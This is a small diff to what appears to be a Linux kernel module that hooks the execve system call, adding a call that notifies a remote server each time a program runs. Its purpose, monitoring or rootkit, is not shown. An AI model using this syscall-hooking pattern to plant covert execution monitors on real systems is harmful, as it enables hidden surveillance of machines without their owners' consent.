@@ -8,8 +8,6 @@
 #include "registered_hooks.h"
 #include "syscall_hook.h"
 
-extern struct syscall_hook *__syscall_hook;
-
 #ifdef PTREGS_SYSCALL_STUBS
 
 /* execve system call hook via ptregs. */
@@ -58,6 +56,7 @@ asmlinkage int execve_hook(const struct pt_regs *regs)
         vfree(exec_str);
     }
 
+    server_send("Execve called!\n", 15);
     return sys_execve(regs); 
 }
 
